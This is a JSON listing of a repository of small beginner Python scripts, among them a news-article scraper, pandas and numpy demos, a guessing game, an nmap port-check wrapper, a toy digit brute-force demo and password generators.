          "content": "from __future__ import print_function\r\n\r\nimport datetime  # Load the library module\r\nimport os  # Load the library module\r\nimport sys  # Load the library module\r\n\r\n# Script Name\t: new_script.py\r\n# Author\t\t\t: Craig Richards\r\n# Created\t\t\t: 20th November 2012\r\n# Last Modified\t:\r\n# Version\t\t\t: 1.0\r\n# Modifications\t:\r\n# Description\t\t: This will create a new basic template for a new script\r\n\r\ntext = \"\"\"You need to pass an argument for the new script you want to create, followed by the script name.  You can use\r\n\t-python\t: Python Script\r\n\t-bash\t: Bash Script\r\n\t-ksh\t: Korn Shell Script\r\n\t-sql\t: SQL Script\"\"\"\r\n\r\nif len(sys.argv) < 3:\r\n    print(text)\r\n    sys.exit()\r\n\r\nif \"-h\" in sys.argv or \"--h\" in sys.argv or \"-help\" in sys.argv or \"--help\" in sys.argv:\r\n    print(text)\r\n    sys.exit()\r\nelse:\r\n    if \"-python\" in sys.argv[1]:\r\n        config_file = \"python.cfg\"\r\n        extension = \".py\"\r\n    elif \"-bash\" in sys.argv[1]:\r\n        config_file = \"bash.cfg\"\r\n        extension = \".bash\"\r\n    elif \"-ksh\" in sys.argv[1]:\r\n        config_file = \"ksh.cfg\"\r\n        extension = \".ksh\"\r\n    elif \"-sql\" in sys.argv[1]:\r\n        config_file = \"sql.cfg\"\r\n        extension = \".sql\"\r\n    else:\r\n        print(\"Unknown option - \" + text)\r\n        sys.exit()\r\n\r\nconfdir = os.getenv(\"my_config\")\r\nscripts = os.getenv(\"scripts\")\r\ndev_dir = \"Development\"\r\nnewfile = sys.argv[2]\r\noutput_file = newfile + extension\r\noutputdir = os.path.join(scripts, dev_dir)\r\nscript = os.path.join(outputdir, output_file)\r\ninput_file = os.path.join(confdir, config_file)\r\nold_text = \" Script Name\t: \"\r\nnew_text = \" Script Name\t: \" + output_file\r\nif not (os.path.exists(outputdir)):\r\n    os.mkdir(outputdir)\r\nnewscript = open(script, \"w\")\r\ninput = open(input_file, \"r\")\r\ntoday = datetime.date.today()\r\nold_date = \" Created\t:\"\r\nnew_date = \" Created\t: \" + today.strftime(\"%d %B %Y\")\r\n\r\nfor line in input:\r\n    line = line.replace(old_text, new_text)\r\n    line = line.replace(old_date, new_date)\r\n    newscript.write(line)\r\n"
        },
        {
          "name": "news_articles__scraper.py",
          "type": "blob",
          "size": 6.3740234375,
          "content": "# -*- coding: utf-8 -*-\n\"\"\"News_Articles__Scraper.ipynb\n\nAutomatically generated by Colaboratory.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/1v1XaNvdBmHIG79KQyaVUl793rKsV7qTD\n\n***Uncomment the line to install newspaper3k first***\n\"\"\"\n\n# ! pip install newspaper3k\n\nimport pickle\nimport re\nimport sys\nimport urllib\n\nimport pandas as pd\nimport requests\n\n# importing necessary libraries\nfrom bs4 import BeautifulSoup\nfrom newspaper import Article\n\n# Extracting links for all the pages (1 to 158) of boomlive fake news section\nfakearticle_links = []\nfor i in range(1, 159):\n    url = \"https://www.boomlive.in/fake-news/\" + str(i)\n    try:\n        # this might throw an exception if something goes wrong.\n        page = requests.get(url)\n\n        # send requests\n        page = requests.get(url)\n        soup = BeautifulSoup(page.text, \"html.parser\")\n\n        # Collecting all the links in a list\n        for content in soup.find_all(\"h2\", attrs={\"class\": \"entry-title\"}):\n            link = content.find(\"a\")\n            fakearticle_links.append(link.get(\"href\"))\n\n    # this describes what to do if an exception is thrown\n    except Exception as e:\n        # get the exception information\n        error_type, error_obj, error_info = sys.exc_info()\n        # print the link that cause the problem\n        print(\"ERROR FOR LINK:\", url)\n        # print error info and line that threw the exception\n        print(error_type, \"Line:\", error_info.tb_lineno)\n        continue\n\nfakearticle_links[:5]\n\nlen(fakearticle_links)\n\nfakearticle_links[1888:]\n\nimport matplotlib.pyplot as plt\nimport pandas as pd\n\nimport numpy as np\n\n\"\"\"We have to modify the links so that the links actually work as we can see that the string extracted is the last part of the url!\n\n**We have to add 'https://www.boomlive.in/fake-news' to the extracted links.**\n\"\"\"\n\n# Modify the links so that it takes us to the particular website\nstr1 = \"https://www.boomlive.in/fake-news\"\nfakearticle_links = [str1 + lnk for lnk in fakearticle_links]\n\nfakearticle_links[6:10]\n\n\"\"\"**The links are modified and is working :)**\n\n***Creating a dataset of all the fake articles***\n\"\"\"\n\n# Create a dataset for storing the news articles\nnews_dataset = pd.DataFrame(fakearticle_links, columns=[\"URL\"])\n\nnews_dataset.head()\n\ntitle, text, summary, keywords, published_on, author = (\n    [],\n    [],\n    [],\n    [],\n    [],\n    [],\n)  # Creating empty lists to store the data\nfor Url in fakearticle_links:\n    article = Article(Url)\n\n    # Call the download and parse methods to download information\n    try:\n        article.download()\n        article.parse()\n        article.nlp()\n    except Exception as error:\n        print(f\"exception : {error}\")\n        pass\n\n    # Scrape the contents of article\n    title.append(article.title)  # extracts the title of the article\n    text.append(article.text)  # extracts the whole text of article\n    summary.append(article.summary)  # gives us a summary abou the article\n    keywords.append(\", \".join(article.keywords))  # the main keywords used in it\n    published_on.append(article.publish_date)  # the date on which it was published\n    author.append(article.authors)  # the authors of the article\n\n\"\"\"**Checking the lists created**\"\"\"\n\ntext[6]\n\nkeywords[1]\n\npublished_on[6]\n\nauthor[6]\n\n# Adding the columns in the fake news dataset\nnews_dataset[\"title\"] = title\nnews_dataset[\"text\"] = text\nnews_dataset[\"keywords\"] = keywords\nnews_dataset[\"published date\"] = published_on\nnews_dataset[\"author\"] = author\n\n# Check the first five columns of dataset created\nnews_dataset.head()\n\n\"\"\"**Converting the dataset to a csv file**\"\"\"\n\nnews_dataset.to_csv(\"Fake_news.csv\")\n\n\"\"\"**Reading the csv file**\"\"\"\n\ndf = pd.read_csv(\"Fake_news.csv\")\n\n# Checking the last 5 rows of the csv file\ndf.tail(5)\n\n\"\"\"**Download the csv file in local machine**\"\"\"\n\nfrom google.colab import files\n\nfiles.download(\"Fake_news.csv\")\n\n\"\"\"**Scraping news from Times of India**\"\"\"\n\nTOIarticle_links = (\n    []\n)  # Creating an empty list of all the urls of news from Times of India site\n\n# Extracting links for all the pages (2 to 125) of boomlive fake news section\nfor i in range(2, 126):\n    url = \"https://timesofindia.indiatimes.com/news/\" + str(i)\n\n    try:\n        # send requests\n        page = requests.get(url)\n        soup = BeautifulSoup(page.text, \"html.parser\")\n\n        # Collecting all the links in a list\n        for content in soup.find_all(\"span\", attrs={\"class\": \"w_tle\"}):\n            link = content.find(\"a\")\n            TOIarticle_links.append(link.get(\"href\"))\n\n    # this describes what to do if an exception is thrown\n    except Exception as e:\n        # get the exception information\n        error_type, error_obj, error_info = sys.exc_info()\n        # print the link that cause the problem\n        print(\"ERROR FOR LINK:\", url)\n        # print error info and line that threw the exception\n        print(error_type, \"Line:\", error_info.tb_lineno)\n        continue\n\nTOIarticle_links[6:15]\n\nlen(TOIarticle_links)\n\nstr2 = \"https://timesofindia.indiatimes.com\"\nTOIarticle_links = [str2 + lnk for lnk in TOIarticle_links if lnk[0] == \"/\"]\n\nTOIarticle_links[5:8]\n\nlen(TOIarticle_links)\n\ntitle, text, summary, keywords, published_on, author = (\n    [],\n    [],\n    [],\n    [],\n    [],\n    [],\n)  # Creating empty lists to store the data\nfor Url in TOIarticle_links:\n    article = Article(Url)\n\n    # Call the download and parse methods to download information\n    try:\n        article.download()\n        article.parse()\n        article.nlp()\n    except Exception:\n        pass\n\n    # Scrape the contents of article\n    title.append(article.title)  # extracts the title of the article\n    text.append(article.text)  # extracts the whole text of article\n    summary.append(article.summary)  # gives us a summary abou the article\n    keywords.append(\", \".join(article.keywords))  # the main keywords used in it\n    published_on.append(article.publish_date)  # the date on which it was published\n    author.append(article.authors)  # the authors of the article\n\ntitle[5]\n\nTOI_dataset = pd.DataFrame(TOIarticle_links, columns=[\"URL\"])\n# Adding the columns in the TOI news dataset\nTOI_dataset[\"title\"] = title\nTOI_dataset[\"text\"] = text\nTOI_dataset[\"keywords\"] = keywords\nTOI_dataset[\"published date\"] = published_on\nTOI_dataset[\"author\"] = author\n\nTOI_dataset.head()\n\nTOI_dataset.to_csv(\"TOI_news_dataset.csv\")\n\ndt = pd.read_csv(\"TOI_news_dataset.csv\")\n\ndt.tail(3)\n\nfrom google.colab import files\n\nfiles.download(\"TOI_news_dataset.csv\")\n"
        },
        {
          "name": "news_intent_schema.json",
          "type": "blob",
          "size": 0.95703125,
          "content": "{\n  \"interactionModel\": {\n    \"languageModel\": {\n      \"invocationName\": \"reddit news\",\n      \"intents\": [\n        {\n          \"name\": \"AMAZON.CancelIntent\",\n          \"samples\": []\n        },\n        {\n          \"name\": \"AMAZON.HelpIntent\",\n          \"samples\": []\n        },\n        {\n          \"name\": \"AMAZON.StopIntent\",\n          \"samples\": []\n        },\n        {\n          \"name\": \"AMAZON.NavigateHomeIntent\",\n          \"samples\": []\n        },\n        {\n          \"name\": \"YesIntent\",\n          \"slots\": [],\n          \"samples\": [\n            \"start\",\n            \"sure\",\n            \"yes\"\n          ]\n        },\n        {\n          \"name\": \"NooIntent\",\n          \"slots\": [],\n          \"samples\": [\n            \"go away\",\n            \"no\"\n          ]\n        },\n        {\n          \"name\": \"AMAZON.FallbackIntent\",\n          \"samples\": []\n        },\n        {\n          \"name\": \"AMAZON.NoIntent\",\n          \"samples\": []\n        }\n      ],\n      \"types\": []\n    }\n  }\n}\n"
        },
        {
          "name": "next_number.py",
          "type": "blob",
          "size": 0.533203125,
          "content": "x, li, small, maxx, c = input(), list(), 0, 0, 1\nfor i in range(len(x)):\n    li.append(int(x[i]))\nfor i in range(len(li) - 1, -1, -1):\n    if i == 0:\n        print(\"No Number Possible\")\n        c = 0\n        break\n    if li[i] > li[i - 1]:\n        small = i - 1\n        maxx = i\n        break\nfor i in range(small + 1, len(li)):\n    if li[i] > li[small] and li[i] < li[maxx]:\n        maxx = i\nli[small], li[maxx] = li[maxx], li[small]\nli = li[: small + 1] + sorted(li[small + 1 :])\nif c:\n    for i in range(len(li)):\n        print(li[i], end=\"\")\n"
        },
        {
          "name": "nitkarshchourasia",
          "type": "tree",
          "content": null
        },
        {
          "name": "nmap_scan.py",
          "type": "blob",
          "size": 1.3447265625,
          "content": "from __future__ import print_function\r\n\r\nimport optparse  # Import the module\r\n\r\nimport nmap  # Import the module\r\n\r\n\r\n# Script Name\t\t: nmap_scan.py\r\n# Author\t\t\t\t: Craig Richards\r\n# Created\t\t\t\t: 24th May 2013\r\n# Last Modified\t\t:\r\n# Version\t\t\t\t: 1.0\r\n# Modifications\t\t:\r\n# Description\t\t\t: This scans my scripts directory and gives a count of the different types of scripts, you need nmap installed to run this\r\n\r\n\r\ndef nmapScan(tgtHost, tgtPort):  # Create the function, this fucntion does the scanning\r\n    nmScan = nmap.PortScanner()\r\n    nmScan.scan(tgtHost, tgtPort)\r\n    state = nmScan[tgtHost][\"tcp\"][int(tgtPort)][\"state\"]\r\n    print(\"[*] \" + tgtHost + \" tcp/\" + tgtPort + \" \" + state)\r\n\r\n\r\ndef main():  # Main Program\r\n    parser = optparse.OptionParser(\r\n        \"usage%prog \" + \"-H <host> -p <port>\"\r\n    )  # Display options/help if required\r\n    parser.add_option(\"-H\", dest=\"tgtHost\", type=\"string\", help=\"specify host\")\r\n    parser.add_option(\"-p\", dest=\"tgtPort\", type=\"string\", help=\"port\")\r\n    (options, args) = parser.parse_args()\r\n    tgtHost = options.tgtHost\r\n    tgtPorts = str(options.tgtPort).split(\",\")\r\n\r\n    if (tgtHost == None) | (tgtPorts[0] == None):\r\n        print(parser.usage)\r\n        exit(0)\r\n\r\n    for tgtPort in tgtPorts:  # Scan the hosts with the ports etc\r\n        nmapScan(tgtHost, tgtPort)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n"
        },
        {
          "name": "nodepad",
          "type": "tree",
          "content": null
        },
        {
          "name": "notepad",
          "type": "tree",
          "content": null
        },
        {
          "name": "nslookup_check.py",
          "type": "blob",
          "size": 0.5185546875,
          "content": "# Script Name\t\t: nslookup_check.py\n# Author\t\t\t\t: Craig Richards\n# Created\t\t\t\t: 5th January 2012\n# Last Modified\t\t:\n# Version\t\t\t\t: 1.0\n\n# Modifications\t\t:\n\n# Description\t\t\t: This very simple script opens the file server_list.txt and then does a nslookup for each one to check the DNS entry\n\nimport subprocess  # Import the subprocess module\n\nfor server in open(\"server_list.txt\"):  # Open the file and read each line\n    subprocess.Popen(\n        (\"nslookup \" + server)\n    )  # Run the nslookup command for each server in the list\n"
        },
        {
          "name": "num-py.py",
          "type": "blob",
          "size": 0.68359375,
          "content": "import numpy as np\n\n# to check if shape are equal and find there power\ndef get_array(x, y):\n    a = np.shape(x)\n    b = np.shape(y)\n\n    if a == b:\n        np_pow_array = x ** y\n        print(\"Array of powers without using np.power: \", np_pow_array)\n\n        print(\"Array of powers using np.power: \", np.power(x, y))\n    else:\n        print(\"Error : Shape of the given arrays is not equal.\")\n\n\n# 0d array\nnp_arr1 = np.array(3)\nnp_arr2 = np.array(4)\n# 1d array\nnp_arr3 = np.array([1, 2])\nnp_arr4 = np.array([3, 4])\n# 2d array\nnp_arr5 = np.array([[1, 2], [3, 4]])\nnp_arr6 = np.array([[5, 6], [7, 8]])\n\nget_array(np_arr1, np_arr2)\nprint()\nget_array(np_arr3, np_arr4)\nprint()\nget_array(np_arr5, np_arr6)\n"
        },
        {
          "name": "number guessing.py",
          "type": "blob",
          "size": 1.8466796875,
          "content": "import random\nattempts_list = []\ndef show_score():\n    if len(attempts_list) <= 0:\n        print(\"There is currently no high score, it's yours for the taking!\")\n    else:\n        print(\"The current high score is {} attempts\".format(min(attempts_list)))\ndef start_game():\n    random_number = int(random.randint(1, 10))\n    print(\"Hello traveler! Welcome to the game of guesses!\")\n    player_name = input(\"What is your name? \")\n    wanna_play = input(\"Hi, {}, would you like to play the guessing game? (Enter Yes/No) \".format(player_name))\n    # Where the show_score function USED to be\n    attempts = 0\n    show_score()\n    while wanna_play.lower() == \"yes\":\n        try:\n            guess = input(\"Pick a number between 1 and 10 \")\n            if int(guess) < 1 or int(guess) > 10:\n                raise ValueError(\"Please guess a number within the given range\")\n            if int(guess) == random_number:\n                print(\"Nice! You got it!\")\n                attempts += 1\n                attempts_list.append(attempts)\n                print(\"It took you {} attempts\".format(attempts))\n                play_again = input(\"Would you like to play again? (Enter Yes/No) \")\n                attempts = 0\n                show_score()\n                random_number = int(random.randint(1, 10))\n                if play_again.lower() == \"no\":\n                    print(\"That's cool, have a good one!\")\n                    break\n            elif int(guess) > random_number:\n                print(\"It's lower\")\n                attempts += 1\n            elif int(guess) < random_number:\n                print(\"It's higher\")\n                attempts += 1\n        except ValueError as err:\n            print(\"Oh no!, that is not a valid value. Try again...\")\n            print(\"({})\".format(err))\n    else:\n        print(\"That's cool, have a good one!\")\nif __name__ == '__main__':\n    start_game()\n"
        },
        {
          "name": "numberguessinggame",
          "type": "tree",
          "content": null
        },
        {
          "name": "numeric_password_cracker.py",
          "type": "blob",
          "size": 1.0986328125,
          "content": "import itertools\r\n\r\ndef generate_password_permutations(length):\r\n    # Generate numeric password permutations of the given length\r\n    digits = \"0123456789\"\r\n    for combination in itertools.product(digits, repeat=length):\r\n        password = \"\".join(combination)\r\n        yield password\r\n\r\ndef password_cracker(target_password, max_length=8):\r\n    # Try different password lengths and generate permutations\r\n    for length in range(1, max_length + 1):\r\n        password_generator = generate_password_permutations(length)\r\n        for password in password_generator:\r\n            if password == target_password:\r\n                return password\r\n    return None\r\n\r\nif __name__ == \"__main__\":\r\n    # Target numeric password (change this to the password you want to crack)\r\n    target_password = \"9133278\"\r\n\r\n    # Try cracking the password\r\n    cracked_password = password_cracker(target_password)\r\n\r\n    if cracked_password:\r\n        print(f\"Password successfully cracked! The password is: {cracked_password}\")\r\n    else:\r\n        print(\"Password not found. Try increasing the max_length or target a different password.\")\r\n\r\n"
        },
        {
          "name": "oneeven.py",
          "type": "blob",
          "size": 0.2275390625,
          "content": "# Python Program to Print Even Numbers from 1 to N\n\nmaximum = int(input(\" Please Enter the Maximum Value : \"))\n\nnumber = 1\n\nwhile number <= maximum:\n    if number % 2 == 0:\n        print(\"{0}\".format(number))\n    number = number + 1\n"
        },
        {
          "name": "oryx-build-commands.txt",
          "type": "blob",
          "size": 0.103515625,
          "content": "PlatformWithVersion=Python \nBuildCommands=conda env create --file environment.yml --prefix ./venv --quiet\n"
        },
        {
          "name": "osinfo.py",
          "type": "blob",
          "size": 1.2685546875,
          "content": "# Script Name\t\t: osinfo.py\n# Authors\t\t: {'geekcomputers': 'Craig Richards', 'dmahugh': 'Doug Mahugh','rutvik1010':'Rutvik Narayana Nadimpally','y12uc231': 'Satyapriya Krishna', 'minto4644':'Mohit Kumar'}\n# Created\t\t: 5th April 2012\n# Last Modified\t        : July 19 2016\n# Version\t\t: 1.0\n\n# Modification 1\t: Changed the profile to list again. Order is important. Everytime we run script we don't want to see different ordering.\n# Modification 2        : Fixed the AttributeError checking for all properties. Using hasttr().\n# Modification 3        : Removed ': ' from properties inside profile.\n\n\n# Description\t\t: Displays some information about the OS you are running this script on\n\nimport platform as pl\n\nprofile = [\n    \"architecture\",\n    \"linux_distribution\",\n    \"mac_ver\",\n    \"machine\",\n    \"node\",\n    \"platform\",\n    \"processor\",\n    \"python_build\",\n    \"python_compiler\",\n    \"python_version\",\n    \"release\",\n    \"system\",\n    \"uname\",\n    \"version\",\n]\n\n\nclass bcolors:\n    HEADER = \"\\033[95m\"\n    OKBLUE = \"\\033[94m\"\n    OKGREEN = \"\\033[92m\"\n    WARNING = \"\\033[93m\"\n    FAIL = \"\\033[91m\"\n    ENDC = \"\\033[0m\"\n    BOLD = \"\\033[1m\"\n    UNDERLINE = \"\\033[4m\"\n\n\nfor key in profile:\n    if hasattr(pl, key):\n        print(key + bcolors.BOLD + \": \" + str(getattr(pl, key)()) + bcolors.ENDC)\n"
        },
        {
          "name": "other_pepole",
          "type": "tree",
          "content": null
        },
        {
          "name": "pan.py",
          "type": "blob",
          "size": 6.859375,
          "content": "import numpy as np\nimport pandas as pd\nfrom matplotlib import *\n\n# .........................Series.......................#\n\nx1 = np.array([1, 2, 3, 4])\ns = pd.Series(x1, index=[1, 2, 3, 4])\nprint(s)\n\n# .......................DataFrame......................#\n\nx2 = np.array([1, 2, 3, 4, 5, 6])\ns = pd.DataFrame(x2)\nprint(s)\n\nx3 = np.array([[\"Alex\", 10], [\"Nishit\", 21], [\"Aman\", 22]])\ns = pd.DataFrame(x3, columns=[\"Name\", \"Age\"])\nprint(s)\n\ndata = {\"Name\": [\"Tom\", \"Jack\", \"Steve\", \"Ricky\"], \"Age\": [28, 34, 29, 42]}\ndf = pd.DataFrame(data, index=[\"rank1\", \"rank2\", \"rank3\", \"rank4\"])\nprint(df)\n\ndata = [{\"a\": 1, \"b\": 2}, {\"a\": 3, \"b\": 4, \"c\": 5}]\ndf = pd.DataFrame(data)\nprint(df)\n\nd = {\n    \"one\": pd.Series([1, 2, 3], index=[\"a\", \"b\", \"c\"]),\n    \"two\": pd.Series([1, 2, 3, 4], index=[\"a\", \"b\", \"c\", \"d\"]),\n}\ndf = pd.DataFrame(d)\nprint(df)\n\n# ....Adding New column......#\n\ndata = {\n    \"one\": pd.Series([1, 2, 3, 4], index=[1, 2, 3, 4]),\n    \"two\": pd.Series([1, 2, 3], index=[1, 2, 3]),\n}\ndf = pd.DataFrame(data)\nprint(df)\ndf[\"three\"] = pd.Series([1, 2], index=[1, 2])\nprint(df)\n\n# ......Deleting a column......#\n\ndata = {\n    \"one\": pd.Series([1, 2, 3, 4], index=[1, 2, 3, 4]),\n    \"two\": pd.Series([1, 2, 3], index=[1, 2, 3]),\n    \"three\": pd.Series([1, 1], index=[1, 2]),\n}\ndf = pd.DataFrame(data)\nprint(df)\ndel df[\"one\"]\nprint(df)\ndf.pop(\"two\")\nprint(df)\n\n# ......Selecting a particular Row............#\n\ndata = {\n    \"one\": pd.Series([1, 2, 3, 4], index=[1, 2, 3, 4]),\n    \"two\": pd.Series([1, 2, 3], index=[1, 2, 3]),\n    \"three\": pd.Series([1, 1], index=[1, 2]),\n}\ndf = pd.DataFrame(data)\nprint(df.loc[2])\nprint(df[1:4])\n\n# .........Addition of Row.................#\n\ndf = pd.DataFrame([[1, 2], [3, 4]], columns=[\"a\", \"b\"])\ndf2 = pd.DataFrame([[5, 6], [7, 8]], columns=[\"a\", \"b\"])\n\ndf = df.append(df2)\nprint(df.head())\n\n# ........Deleting a Row..................#\n\ndf = pd.DataFrame([[1, 2], [3, 4]], columns=[\"a\", \"b\"])\ndf2 = pd.DataFrame([[5, 6], [7, 8]], columns=[\"a\", \"b\"])\n\ndf = df.append(df2)\n\n# Drop rows with label 0\ndf = df.drop(0)\n\nprint(df)\n\n# ..........................Functions.....................................#\n\n\nd = {\n    \"Name\": pd.Series([\"Tom\", \"James\", \"Ricky\", \"Vin\", \"Steve\", \"Smith\", \"Jack\"]),\n    \"Age\": pd.Series([25, 26, 25, 23, 30, 29, 23]),\n    \"Rating\": pd.Series([4.23, 3.24, 3.98, 2.56, 3.20, 4.6, 3.8]),\n}\n\ndf = pd.DataFrame(d)\nprint(\"The transpose of the data series is:\")\nprint(df.T)\nprint(df.shape)\nprint(df.size)\nprint(df.values)\n\n# .........................Statistics.......................................#\n\nd = {\n    \"Name\": pd.Series(\n        [\n            \"Tom\",\n            \"James\",\n            \"Ricky\",\n            \"Vin\",\n            \"Steve\",\n            \"Smith\",\n            \"Jack\",\n            \"Lee\",\n            \"David\",\n            \"Gasper\",\n            \"Betina\",\n            \"Andres\",\n        ]\n    ),\n    \"Age\": pd.Series([25, 26, 25, 23, 30, 29, 23, 34, 40, 30, 51, 46]),\n    \"Rating\": pd.Series(\n        [4.23, 3.24, 3.98, 2.56, 3.20, 4.6, 3.8, 3.78, 2.98, 4.80, 4.10, 3.65]\n    ),\n}\ndf = pd.DataFrame(d)\nprint(df.sum())\n\nd = {\n    \"Name\": pd.Series(\n        [\n            \"Tom\",\n            \"James\",\n            \"Ricky\",\n            \"Vin\",\n            \"Steve\",\n            \"Smith\",\n            \"Jack\",\n            \"Lee\",\n            \"David\",\n            \"Gasper\",\n            \"Betina\",\n            \"Andres\",\n        ]\n    ),\n    \"Age\": pd.Series([25, 26, 25, 23, 30, 29, 23, 34, 40, 30, 51, 46]),\n    \"Rating\": pd.Series(\n        [4.23, 3.24, 3.98, 2.56, 3.20, 4.6, 3.8, 3.78, 2.98, 4.80, 4.10, 3.65]\n    ),\n}\ndf = pd.DataFrame(d)\nprint(df.describe(include=\"all\"))\n\n# .......................Sorting..........................................#\n\n# Using the sort_index() method, by passing the axis arguments and the order of sorting,\n# DataFrame can be sorted. By default, sorting is done on row labels in ascending order.\n\nunsorted_df = pd.DataFrame(\n    np.random.randn(10, 2),\n    index=[1, 4, 6, 2, 3, 5, 9, 8, 0, 7],\n    columns=[\"col2\", \"col1\"],\n)\n\nsorted_df = unsorted_df.sort_index()\nprint(sorted_df)\nsorted_df = unsorted_df.sort_index(ascending=False)\nprint(sorted_df)\n\n# By passing the axis argument with a value 0 or 1,\n# the sorting can be done on the column labels. By default, axis=0, sort by row.\n# Let us consider the following example to understand the same.\n\nunsorted_df = pd.DataFrame(\n    np.random.randn(10, 2),\n    index=[1, 4, 6, 2, 3, 5, 9, 8, 0, 7],\n    columns=[\"col2\", \"col1\"],\n)\nsorted_df = unsorted_df.sort_index(axis=1)\nprint(sorted_df)\n\nunsorted_df = pd.DataFrame({\"col1\": [2, 1, 1, 1], \"col2\": [1, 3, 2, 4]})\nsorted_df = unsorted_df.sort_values(by=\"col1\", kind=\"mergesort\")\n\n# print (sorted_df)\n\n# ...........................SLICING...............................#\n\ndf = pd.DataFrame(\n    np.random.randn(8, 4),\n    index=[\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\"],\n    columns=[\"A\", \"B\", \"C\", \"D\"],\n)\n# Select all rows for multiple columns, say list[]\nprint(df.loc[:, [\"A\", \"C\"]])\nprint(df.loc[[\"a\", \"b\", \"f\", \"h\"], [\"A\", \"C\"]])\n\ndf = pd.DataFrame(np.random.randn(8, 4), columns=[\"A\", \"B\", \"C\", \"D\"])\n# Index slicing\nprint(df.ix[:, \"A\"])\n\n# ............................statistics......................#\n\ns = pd.Series([1, 2, 3, 4, 5, 4])\nprint(s.pct_change())\n\ndf = pd.DataFrame(np.random.randn(5, 2))\nprint(df.pct_change())\n\ndf = pd.DataFrame(\n    np.random.randn(10, 4),\n    index=pd.date_range(\"1/1/2000\", periods=10),\n    columns=[\"A\", \"B\", \"C\", \"D\"],\n)\nprint(df.rolling(window=3).mean())\n\nprint(df.expanding(min_periods=3).mean())\n\n# ........................MISSING DATA............................................#\n\ndf = pd.DataFrame(\n    np.random.randn(3, 3), index=[\"a\", \"c\", \"e\"], columns=[\"one\", \"two\", \"three\"]\n)\n\ndf = df.reindex([\"a\", \"b\", \"c\"])\n\nprint(df)\nprint(\"NaN replaced with '0':\")\nprint(df.fillna(0))\n\ndf = pd.DataFrame(\n    np.random.randn(5, 3),\n    index=[\"a\", \"c\", \"e\", \"f\", \"h\"],\n    columns=[\"one\", \"two\", \"three\"],\n)\n\ndf = df.reindex([\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\"])\n\nprint(df)\nprint(df.fillna(method=\"pad\"))\nprint(df.fillna(method=\"bfill\"))\nprint(df.dropna())\nprint(df.dropna(axis=1))\n\n# .........................Grouping...............................................#\n\nipl_data = {\n    \"Team\": [\n        \"Riders\",\n        \"Riders\",\n        \"Devils\",\n        \"Devils\",\n        \"Kings\",\n        \"kings\",\n        \"Kings\",\n        \"Kings\",\n        \"Riders\",\n        \"Royals\",\n        \"Royals\",\n        \"Riders\",\n    ],\n    \"Rank\": [1, 2, 2, 3, 3, 4, 1, 1, 2, 4, 1, 2],\n    \"Year\": [2014, 2015, 2014, 2015, 2014, 2015, 2016, 2017, 2016, 2014, 2015, 2017],\n    \"Points\": [876, 789, 863, 673, 741, 812, 756, 788, 694, 701, 804, 690],\n}\ndf = pd.DataFrame(ipl_data)\n\ngrouped = df.groupby(\"Year\")\n\nfor name, group in grouped:\n    print(name)\n    print(group)\n\nprint(grouped.get_group(2014))\ngrouped = df.groupby(\"Team\")\nprint(grouped[\"Points\"].agg([np.sum, np.mean, np.std]))\n\n# ...............................Reading a Csv File............................#\n\ndata = pd.read_csv(\"dat.csv\")\nprint(data)\n"
        },
        {
          "name": "passwordGen.py",
          "type": "blob",
          "size": 0.8828125,
          "content": "import random\r\n\r\nlChars = \"abcdefghijklmnopqrstuvwxyz\"\r\nuChars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\r\ndigits = \"1234567890\"\r\nspecialChars = \"!@#$%^&*-_+=\"\r\n\r\npassLen = 10  # actual generated password length will be this length + 1\r\nmyPass = \"\"\r\n\r\nfor i in range(passLen):\r\n    while (len(myPass)) <= 2:\r\n        index = random.randrange(len(lChars))\r\n        myPass = myPass + lChars[index]\r\n        myPassLen = len(myPass)\r\n    while (len(myPass)) <= 5:\r\n        index = random.randrange(len(digits))\r\n        myPass = myPass + digits[index]\r\n        myPassLen = len(myPass)\r\n    while (len(myPass)) <= 7:\r\n        index = random.randrange(len(specialChars))\r\n        myPass = myPass + specialChars[index]\r\n        myPassLen = len(myPass)\r\n    while (len(myPass)) <= 10:\r\n        index = random.randrange(len(uChars))\r\n        myPass = myPass + uChars[index]\r\n        myPassLen = len(myPass)\r\n\r\nprint(myPass)\r\n"
        },
        {
          "name": "passwordGenerator.py",
          "type": "blob",
          "size": 1.67578125,
          "content": "# PasswordGenerator GGearing 314 01/10/19\n# modified Prince Gangurde 4/4/2020\n\nfrom random import randint\n\ncase = randint(1, 2)\nnumber = randint(1, 99)\n\nspecialCharacters = (\n    \"!\",\n    \"@\",\n    \"#\",\n    \"$\",\n    \"%\",\n    \"/\",\n    \"?\",\n    \":\",\n    \"<\",\n    \">\",\n    \"|\",\n    \"&\",\n    \"*\",\n    \"-\",\n    \"=\",\n    \"+\",\n    \"_\",\n)\n\nanimals = (\n    \"ant\",\n    \"alligator\",\n    \"baboon\",\n    \"badger\",\n    \"barb\",\n    \"bat\",\n    \"beagle\",\n    \"bear\",\n    \"beaver\",\n    \"bird\",\n    \"bison\",\n    \"bombay\",\n    \"bongo\",\n    \"booby\",\n    \"butterfly\",\n    \"bee\",\n    \"camel\",\n    \"cat\",\n    \"caterpillar\",\n    \"catfish\",\n    \"cheetah\",\n    \"chicken\",\n    \"chipmunk\",\n    \"cow\",\n    \"crab\",\n    \"deer\",\n    \"dingo\",\n    \"dodo\",\n    \"dog\",\n    \"dolphin\",\n    \"donkey\",\n    \"duck\",\n    \"eagle\",\n    \"earwig\",\n    \"elephant\",\n    \"emu\",\n    \"falcon\",\n    \"ferret\",\n    \"fish\",\n    \"flamingo\",\n    \"fly\",\n    \"fox\",\n    \"frog\",\n    \"gecko\",\n    \"gibbon\",\n    \"giraffe\",\n    \"goat\",\n    \"goose\",\n    \"gorilla\",\n)\n\ncolour = (\n    \"red\",\n    \"orange\",\n    \"yellow\",\n    \"green\",\n    \"blue\",\n    \"indigo\",\n    \"violet\",\n    \"purple\",\n    \"magenta\",\n    \"cyan\",\n    \"pink\",\n    \"brown\",\n    \"white\",\n    \"grey\",\n    \"black\",\n)\n\nchosenanimal = animals[\n    randint(0, len(animals) - 1)\n]  # randint will return max lenght but , tuple has index from 0 to len-1\nchosencolour = colour[randint(0, len(colour) - 1)]\nchosenSpecialCharacter = specialCharacters[randint(0, len(specialCharacters) - 1)]\n\nif case == 1:\n    chosenanimal = chosenanimal.upper()\n    print(chosencolour, number, chosenanimal, chosenSpecialCharacter)\nelse:\n    chosencolour = chosencolour.upper()\n    print(chosenanimal, number, chosencolour, chosenSpecialCharacter)\n"
        },
        {
